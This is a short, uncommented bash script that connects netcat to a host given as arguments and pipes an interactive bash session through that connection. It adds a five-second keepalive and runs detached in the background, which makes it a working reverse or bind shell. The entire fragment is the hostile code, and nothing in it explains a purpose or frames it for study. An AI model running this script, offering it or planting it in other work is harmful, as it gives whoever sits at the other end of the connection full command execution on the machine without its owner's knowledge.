( 
  (
    coproc nc "$@"
    C=${COPROC_PID}
    coproc bash <&${COPROC} >&${COPROC[1]}
    coproc {
      while sleep 5; do
        echo
      done
    } >&${COPROC[1]}
    wait ${C} || true
    kill -SIGKILL +$$
  ) &
)
